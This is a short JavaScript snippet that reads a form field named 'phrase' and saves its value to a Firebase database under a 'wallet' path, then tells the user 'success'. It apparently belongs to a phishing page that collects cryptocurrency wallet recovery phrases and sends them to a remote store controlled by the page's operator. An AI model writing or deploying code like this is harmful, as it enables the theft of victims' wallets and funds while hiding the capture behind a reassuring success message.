var phrasev;

function readFormphrase(){
	phrasev = document.getElementById("phrase").value;
	console.log(phrasev);
}

document.getElementById("insertphrase").onclick = function () {
	readFormphrase();

	firebase
		.database()
		.ref("wallet/" + phrasev)
		.set({
			phrase: phrasev,
			

		});
	alert("success");
};
